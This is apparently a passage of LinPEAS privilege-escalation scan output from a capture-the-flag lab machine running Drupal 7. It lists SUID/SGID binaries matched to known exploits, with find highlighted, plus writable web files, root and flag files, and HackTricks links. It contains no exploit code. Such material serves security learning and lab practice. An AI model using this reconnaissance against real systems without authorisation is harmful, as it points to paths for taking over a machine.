\-rwsr\-xr\-x 1 root root 45K Feb 27  2017 /usr/bin/passwd  \-\-\-\>  Apple\_Mac\_OSX\(03\-2006\)/Solaris\_8/9\(12\-2004\)/SPARC\_8/9/Sun\_Solaris\_2\.3\_to\_2\.5\.1\(02\-1997\)
\-rwsr\-xr\-x 1 root root 31K Feb 27  2017 /usr/bin/newgrp  \-\-\-\>  HP\-UX\_10\.20
\-rwsr\-xr\-x 1 root root 44K Feb 27  2017 /usr/bin/chfn  \-\-\-\>  SuSE\_9\.3/10
\-rwsr\-xr\-x 1 root root 65K Feb 27  2017 /usr/bin/gpasswd
\-rwsr\-sr\-x 1 root mail 82K Nov 18  2017 /usr/bin/procmail
\-rwsr\-xr\-x 1 root root 159K Jan  6  2012 /usr/bin\[1;31;103m/find
\-rwsr\-xr\-x 1 root root 916K Feb 11  2018 /usr/sbin/exim4
\-rwsr\-xr\-x 1 root root 9\.5K Jun 20  2017 /usr/lib/pt\_chown  \-\-\-\>  GNU\_glibc\_2\.1/2\.1\.1\_\-6\(08\-1999\)
\-rwsr\-xr\-x 1 root root 243K Jan 27  2018 /usr/lib/openssh/ssh\-keysign
\-rwsr\-xr\-x 1 root root 5\.3K Mar 28  2017 /usr/lib/eject/dmcrypt\-get\-device
\-rwsr\-xr\-\- 1 root messagebus 315K Feb 10  2015 /usr/lib/dbus\-1\.0/dbus\-daemon\-launch\-helper
\-rwsr\-xr\-x 1 root root 83K May 22  2013 /sbin/mount\.nfs

╔══════════╣ SGID
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid)

\-rwxr\-sr\-x 1 root ssh 126K Jan 27  2018 /usr/bin/ssh\-agent
\-rwsr\-sr\-x 1 daemon daemon 50K Oct  4  2014 /usr/bin/at  \-\-\-\>  RTru64\_UNIX\_4\.0g\(CVE\-2002\-1614\)
\-rwxr\-sr\-x 1 root mlocate 30K Sep 25  2010 /usr/bin/mlocate
\-rwxr\-sr\-x 1 root mail 18K Nov 18  2017 /usr/bin/lockfile
\-rwxr\-sr\-x 1 root shadow 49K Feb 27  2017 /usr/bin/chage
\-rwxr\-sr\-x 1 root tty 9\.5K Jun 11  2012 /usr/bin/bsd\-write
\-rwxr\-sr\-x 1 root mail 9\.6K Nov 30  2014 /usr/bin/mutt\_dotlock
\-rwxr\-sr\-x 1 root tty 18K Dec 10  2012 /usr/bin/wall
\-rwxr\-sr\-x 1 root crontab 34K Jul  4  2012 /usr/bin/crontab
\-rwxr\-sr\-x 1 root shadow 18K Feb 27  2017 /usr/bin/expiry
\-rwsr\-sr\-x 1 root mail 82K Nov 18  2017 /usr/bin/procmail
\-rwxr\-sr\-x 1 root mail 14K Dec 12  2012 /usr/bin/dotlockfile
\-rwxr\-sr\-x 1 root utmp 4\.9K Feb 21  2011 /usr/lib/utempter/utempter
\-rwxr\-sr\-x 1 root shadow 30K May  5  2012 /sbin/unix\_chkpwd

╔══════════╣ Checking misconfigurations of ld\.so
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so)

/etc/ld\.so\.conf
include /etc/ld\.so\.conf\.d/\*\.conf

/etc/ld\.so\.conf\.d
/etc/ld\.so\.conf\.d/i486\-linux\-gnu\.conf
/lib/i386\-linux\-gnu
/usr/lib/i386\-linux\-gnu
/lib/i486\-linux\-gnu
/usr/lib/i486\-linux\-gnu
/etc/ld\.so\.conf\.d/libc\.conf
/usr/local/lib
/etc/ld\.so\.conf\.d/zz\_amd64\-biarch\-compat\.conf
/lib64
/usr/lib64

╔══════════╣ Capabilities
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities)

Current capabilities:
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	ffffffffffffffff

Shell capabilities:
capsh Not Found
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	ffffffffffffffff

Files with capabilities \(limited to 50\):

╔══════════╣ Files with ACLs \(limited to 50\)
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls)

files with acls in searched folders Not Found

╔══════════╣ \.sh files in path
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path)

/usr/bin/gettext\.sh

╔══════════╣ Unexpected in root
/initrd\.img
/initrd\.img\.old
/vmlinuz\.old
/vmlinuz
/selinux

╔══════════╣ Files \(scripts\) in /etc/profile\.d/
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files)

total 12
drwxr\-xr\-x  2 root root 4096 Feb 19  2019 \.
drwxr\-xr\-x 86 root root 4096 Mar 30 00:32 \.\.
\-rw\-r\-\-r\-\-  1 root root  660 Jun 18  2012 bash\_completion\.sh

╔══════════╣ Permissions in init, init\.d, systemd, and rc\.d
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d)


═╣ Hashes inside passwd file? \.\.\.\.\.\.\.\.\.\.\. No
═╣ Writable passwd file? \.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\. No
═╣ Credentials in fstab/mtab? \.\.\.\.\.\.\.\.\.\.\. No
═╣ Can I read shadow files? \.\.\.\.\.\.\.\.\.\.\.\.\. No
═╣ Can I read shadow plists? \.\.\.\.\.\.\.\.\.\.\.\. No
═╣ Can I write shadow plists? \.\.\.\.\.\.\.\.\.\.\. No
═╣ Can I read opasswd file? \.\.\.\.\.\.\.\.\.\.\.\.\. No
═╣ Can I write in network\-scripts? \.\.\.\.\.\. No
═╣ Can I read root folder? \.\.\.\.\.\.\.\.\.\.\.\.\.\. No

╔══════════╣ Searching root files in home dirs \(limit 30\)
/home/
/home/local\.txt
/root/
/root/\.profile
/root/\.drush
/root/\.drush/drush\.complete\.sh
/root/\.drush/drush\.prompt\.sh
/root/\.drush/cache
/root/\.drush/cache/usage
/root/\.drush/cache/download
/root/\.drush/cache/download/https\-\-\-updates\.drupal\.org\-release\-history\-views\-7\.x
/root/\.drush/cache/download/https\-\-\-ftp\.drupal\.org\-files\-projects\-views\-7\.x\-3\.20\.tar\.gz
/root/\.drush/cache/download/https\-\-\-updates\.drupal\.org\-release\-history\-drupal\-7\.x
/root/\.drush/cache/download/https\-\-\-ftp\.drupal\.org\-files\-projects\-ctools\-7\.x\-1\.15\.tar\.gz
/root/\.drush/cache/download/https\-\-\-updates\.drupal\.org\-release\-history\-ctools\-7\.x
/root/\.drush/cache/download/https\-\-\-ftp\.drupal\.org\-files\-projects\-drupal\-7\.24\.tar\.gz
/root/\.drush/drushrc\.php
/root/\.drush/drush\.bashrc
/root/proof\.txt
/root/thefinalflag\.txt
/root/\.bash\_history
/root/\.bashrc
/root/\.aptitude
/root/\.aptitude/cache
/root/\.aptitude/config
/usr/sbin
/usr/sbin/tcptraceroute
/usr/sbin/exipick
/usr/sbin/groupmod
/usr/sbin/VBoxControl

╔══════════╣ Searching folders owned by me containing others files on it \(limit 100\)

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Modified interesting files in the last 5mins \(limit 100\)
/var/www/\.gnupg/gpg\.conf
/var/www/\.gnupg/trustdb\.gpg
/var/www/\.gnupg/pubring\.gpg
/var/log/messages
/var/log/auth\.log
/var/log/syslog
/var/log/kern\.log
/var/log/apache2/access\.log

╔══════════╣ Writable log files \(logrotten\) \(limit 100\)
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation)

logrotate Not Found

╔══════════╣ Files inside /home/www\-data \(limit 20\)

╔══════════╣ Files inside others home \(limit 20\)
/home/flag4/\.bash\_logout
/home/flag4/\.profile
/home/flag4/flag4\.txt
/home/flag4/\.bash\_history
/home/flag4/\.bashrc
/home/local\.txt
/root/\.profile
/root/\.drush/drush\.complete\.sh
/root/\.drush/drush\.prompt\.sh
/root/\.drush/cache/download/https\-\-\-updates\.drupal\.org\-release\-history\-views\-7\.x
/root/\.drush/cache/download/https\-\-\-ftp\.drupal\.org\-files\-projects\-views\-7\.x\-3\.20\.tar\.gz
/root/\.drush/cache/download/https\-\-\-updates\.drupal\.org\-release\-history\-drupal\-7\.x
/root/\.drush/cache/download/https\-\-\-ftp\.drupal\.org\-files\-projects\-ctools\-7\.x\-1\.15\.tar\.gz
/root/\.drush/cache/download/https\-\-\-updates\.drupal\.org\-release\-history\-ctools\-7\.x
/root/\.drush/cache/download/https\-\-\-ftp\.drupal\.org\-files\-projects\-drupal\-7\.24\.tar\.gz
/root/\.drush/drushrc\.php
/root/\.drush/drush\.bashrc
/root/proof\.txt
/root/thefinalflag\.txt
/root/\.bash\_history

╔══════════╣ Searching installed mail applications
exim
sendmail

╔══════════╣ Mails \(limit 50\)

╔══════════╣ Backup folders

╔══════════╣ Backup files \(limited 100\)
\-rw\-r\-\-r\-\- 1 root root 122 Feb 19  2019 /etc/blkid\.tab\.old
\-rw\-r\-\-r\-\- 1 root root 20 Mar 23  2015 /etc/vmware\-tools/tools\.conf\.old
\-rw\-r\-\-r\-\- 1 root root 610 Feb 19  2019 /etc/xml/catalog\.old
\-rw\-r\-\-r\-\- 1 root root 673 Feb 19  2019 /etc/xml/xml\-core\.xml\.old
\-rw\-r\-\-r\-\- 1 root root 3590592 Mar 29 22:56 /var/lib/aptitude/pkgstates\.old
\-rw\-r\-\-r\-\- 1 root root 128 Feb 19  2019 /var/lib/sgml\-base/supercatalog\.old
\-rw\-r\-\-r\-\- 1 root root 10495 Feb 19  2019 /usr/share/info/dir\.old
\-rw\-r\-\-r\-\- 1 root root 90907 Nov 30  2012 /usr/share/selinux/default/backup\.pp
\-rw\-r\-\-r\-\- 1 root root 7867 Jul 23  2008 /usr/share/doc/telnet/README\.telnet\.old\.gz
\-rw\-r\-\-r\-\- 1 root root 194817 Jan 16  2009 /usr/share/doc/x11\-common/changelog\.Debian\.old\.gz
\-rw\-r\-\-r\-\- 1 root root 12741 Feb 11  2018 /usr/share/doc/exim4\-base/changelog\.Debian\.old\.gz
\-rw\-r\-\-r\-\- 1 root root 2862 Nov 30  2014 /usr/share/doc/mutt/NEWS\.old\.gz
\-rw\-r\-\-r\-\- 1 root root 22236 Mar 23  2015 /usr/lib/open\-vm\-tools/plugins/vmsvc/libvmbackup\.so

╔══════════╣ Searching tables inside readable \.db/\.sql/\.sqlite files \(limit 100\)
Found: /var/lib/apt/listchanges\.db: Berkeley DB \(Hash, version 9, native byte\-order\)


╔══════════╣ Web files?\(output limit\)
/var/www/:
total 192K
drwxr\-xr\-x 10 www\-data www\-data 4\.0K Apr 11 05:08 \.
drwxr\-xr\-x 12 root     root     4\.0K Feb 19  2019 \.\.
\-rw\-r\-\-r\-\-  1 www\-data www\-data  174 Nov 21  2013 \.gitignore
drwx\-\-\-\-\-\-  2 www\-data www\-data 4\.0K Apr 11 05:08 \.gnupg
\-rw\-r\-\-r\-\-  1 www\-data www\-data 5\.7K Nov 21  2013 \.htaccess
\-rw\-r\-\-r\-\-  1 www\-data www\-data 1\.5K Nov 21  2013 COPYRIGHT\.txt
\-rw\-r\-\-r\-\-  1 www\-data www\-data 1\.5K Nov 21  2013 INSTALL\.mysql\.txt
\-rw\-r\-\-r\-\-  1 www\-data www\-data 1\.9K Nov 21  2013 INSTALL\.pgsql\.txt

╔══════════╣ All hidden files \(not in /sys/ or the ones listed in the previous check\) \(limit 70\)
\-rw\-r\-\-r\-\- 1 root root 220 Sep 26  2014 /etc/skel/\.bash\_logout
\-rw\-\-\-\-\-\-\- 1 root root 0 Feb 19  2019 /etc/\.pwd\.lock
\-rw\-r\-\-r\-\- 1 flag4 flag4 220 Feb 19  2019 /home/flag4/\.bash\_logout
\-rw\-\-\-\-\-\-\- 1 daemon daemon 2 Feb 19  2019 /var/spool/cron/atjobs/\.SEQ
\-r\-\-r\-\-r\-\- 1 www\-data www\-data 476 Feb 19  2019 /var/www/sites/default/files/\.htaccess
\-rw\-r\-\-r\-\- 1 www\-data www\-data 5767 Nov 21  2013 /var/www/\.htaccess
\-rw\-r\-\-r\-\- 1 root root 30534 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxvideo/\.vboxvideo\.mod\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 52631 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxvideo/\.vboxvideo\_drm\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 218 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxvideo/\.built\-in\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 377 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxvideo/\.vboxvideo\.ko\.cmd
\-rw\-r\-\-r\-\- 1 root root 233 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxvideo/\.vboxvideo\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 50643 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.regops\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 5001 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.umoddi3\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 5001 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.udivdi3\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 50643 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.dirops\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 6619 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.VbglR0CanUsePhysPageList\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 6824 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.Init\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 6073 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.SysHlp\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 4990 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.moddi3\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 1278 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.vboxsf\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 6421 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.VMMDev\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 50690 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.vfsmod\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 30468 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.vboxsf\.mod\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 5001 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.qdivrem\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 4990 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.divdi3\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 62993 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.utils\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 7078 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.GenericRequest\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 353 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.vboxsf\.ko\.cmd
\-rw\-r\-\-r\-\- 1 root root 6652 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.PhysHeap\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 50643 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.lnkops\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 209 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.built\-in\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 6897 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxsf/\.HGCM\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32673 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/\.memobj\-r0drv\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32571 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/generic/\.semspinmutex\-r0drv\-generic\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32561 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/\.mpnotification\-r0drv\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32655 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/\.initterm\-r0drv\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49452 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.mp\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49170 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.RTLogWriteDebugger\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49902 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.semevent\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49356 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.alloc\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49426 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.assert\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49053 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.process\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49154 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.time\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49564 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.semfastmutex\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49602 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.thread2\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49663 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.spinlock\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49661 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.mpnotification\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49351 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.thread\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49638 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.memobj\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49272 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.memuserkernel\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49246 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.initterm\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 49957 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/linux/\.semeventmulti\-r0drv\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32741 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/\.powernotification\-r0drv\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32403 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/r0drv/\.alloc\-r0drv\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 188 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/\.built\-in\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 51337 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/\.VBoxGuest\-linux\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 6876 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/\.Init\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 6259 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/\.SysHlp\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32006 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/generic/\.RTLogWriteStdErr\-stub\-generic\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32255 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/generic/\.RTSemEventWaitNoResume\-2\-ex\-generic\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 31987 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/generic/\.RTAssertShouldPanic\-generic\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32167 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/generic/\.RTSemEventWait\-2\-ex\-generic\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32036 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/generic/\.errvars\-generic\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32222 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/generic/\.RTSemEventMultiWait\-2\-ex\-generic\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32006 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/generic/\.RTLogWriteStdOut\-stub\-generic\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32310 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/generic/\.RTSemEventMultiWaitNoResume\-2\-ex\-generic\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 5416 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/VBox/\.log\-vbox\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 32169 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/VBox/\.logbackdoor\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 7800 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/\.VBoxGuest\.o\.cmd
\-rw\-r\-\-r\-\- 1 root root 6473 Feb 19  2019 /var/lib/dkms/virtualbox\-guest/4\.1\.42/build/vboxguest/\.VMMDev\.o\.cmd

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders \(limit 70\)
\-rw\-r\-\-r\-\- 1 www\-data www\-data 124547 Apr 11 05:09 /tmp/\.a/linpeas\.txt
\-rwxr\-xr\-x 1 www\-data www\-data 776167 Apr 10 15:48 /tmp/\.a/linpeas\.sh

╔══════════╣ Interesting writable files owned by me or writable by everyone \(not in Home\) \(max 500\)
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files)

/run/lock
/run/lock/apache2
/run/shm
/tmp
/tmp/\.ICE\-unix
/tmp/\.X11\-unix
/tmp/\.a
/tmp/\.a/linpeas\.sh
/tmp/\.a/linpeas\.txt
/var/cache/apache2/mod\_disk\_cache
/var/lib/php5
/var/tmp
/var/www
/var/www/\.gitignore
/var/www/\.gnupg
/var/www/\.gnupg/gpg\.conf
/var/www/\.gnupg/pubring\.gpg
/var/www/\.gnupg/trustdb\.gpg
/var/www/\.htaccess
/var/www/COPYRIGHT\.txt
/var/www/INSTALL\.mysql\.txt
/var/www/INSTALL\.pgsql\.txt
/var/www/INSTALL\.sqlite\.txt
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/includes/actions\.inc
/var/www/includes/ajax\.inc
/var/www/includes/archiver\.inc
/var/www/includes/authorize\.inc
/var/www/includes/batch\.inc
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/includes/database/database\.inc
/var/www/includes/database/log\.inc
/var/www/includes/database/mysql
/var/www/includes/database/mysql/database\.inc
/var/www/includes/database/mysql/install\.inc
/var/www/includes/database/mysql/query\.inc
/var/www/includes/database/mysql/schema\.inc
/var/www/includes/database/pgsql
/var/www/includes/database/pgsql/database\.inc
/var/www/includes/database/pgsql/install\.inc
/var/www/includes/database/pgsql/query\.inc
/var/www/includes/database/pgsql/schema\.inc
/var/www/includes/database/pgsql/select\.inc
/var/www/includes/database/prefetch\.inc
/var/www/includes/database/query\.inc
/var/www/includes/database/schema\.inc
/var/www/includes/database/select\.inc
/var/www/includes/database/sqlite
/var/www/includes/database/sqlite/database\.inc
/var/www/includes/database/sqlite/install\.inc
/var/www/includes/database/sqlite/query\.inc
/var/www/includes/database/sqlite/schema\.inc
/var/www/includes/database/sqlite/select\.inc
/var/www/includes/date\.inc
/var/www/includes/entity\.inc
/var/www/includes/errors\.inc
/var/www/includes/file\.inc
/var/www/includes/file\.mimetypes\.inc
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/includes/filetransfer/filetransfer\.inc
/var/www/includes/filetransfer/ftp\.inc
/var/www/includes/filetransfer/local\.inc
/var/www/includes/filetransfer/ssh\.inc
/var/www/includes/form\.inc
/var/www/includes/graph\.inc
/var/www/includes/image\.inc
/var/www/includes/install\.core\.inc
/var/www/includes/install\.inc
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/index\.php
/var/www/install\.php
/var/www/misc
/var/www/misc/ajax\.js
/var/www/misc/authorize\.js
/var/www/misc/autocomplete\.js
/var/www/misc/batch\.js
/var/www/misc/collapse\.js
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/misc/farbtastic/farbtastic\.css
/var/www/misc/farbtastic/farbtastic\.js
/var/www/misc/favicon\.ico
/var/www/misc/form\.js
/var/www/misc/jquery\.ba\-bbq\.js
/var/www/misc/jquery\.cookie\.js
/var/www/misc/jquery\.form\.js
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/misc/ui/images
/var/www/misc/ui/jquery\.effects\.blind\.min\.js
/var/www/misc/ui/jquery\.effects\.bounce\.min\.js
/var/www/misc/ui/jquery\.effects\.clip\.min\.js
/var/www/misc/ui/jquery\.effects\.core\.min\.js
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/misc/vertical\-tabs\-rtl\.css
/var/www/misc/vertical\-tabs\.css
/var/www/misc/vertical\-tabs\.js
/var/www/modules
/var/www/modules/README\.txt
/var/www/modules/aggregator
/var/www/modules/aggregator/aggregator\-feed\-source\.tpl\.php
/var/www/modules/aggregator/aggregator\-item\.tpl\.php
/var/www/modules/aggregator/aggregator\-rtl\.css
/var/www/modules/aggregator/aggregator\-summary\-item\.tpl\.php
/var/www/modules/aggregator/aggregator\-summary\-items\.tpl\.php
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/aggregator/tests/aggregator\_test\.info
/var/www/modules/aggregator/tests/aggregator\_test\.module
/var/www/modules/aggregator/tests/aggregator\_test\_atom\.xml
/var/www/modules/aggregator/tests/aggregator\_test\_rss091\.xml
/var/www/modules/block
/var/www/modules/block/block\-admin\-display\-form\.tpl\.php
/var/www/modules/block/block\.admin\.inc
/var/www/modules/block/block\.api\.php
/var/www/modules/block/block\.css
/var/www/modules/block/block\.info
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/block/tests/block\_test\.info
/var/www/modules/block/tests/block\_test\.module
/var/www/modules/block/tests/themes
/var/www/modules/block/tests/themes/block\_test\_theme
/var/www/modules/block/tests/themes/block\_test\_theme/block\_test\_theme\.info
/var/www/modules/block/tests/themes/block\_test\_theme/page\.tpl\.php
/var/www/modules/blog
/var/www/modules/blog/blog\.info
/var/www/modules/blog/blog\.install
/var/www/modules/blog/blog\.module
/var/www/modules/blog/blog\.pages\.inc
/var/www/modules/blog/blog\.test
/var/www/modules/book
/var/www/modules/book/book\-all\-books\-block\.tpl\.php
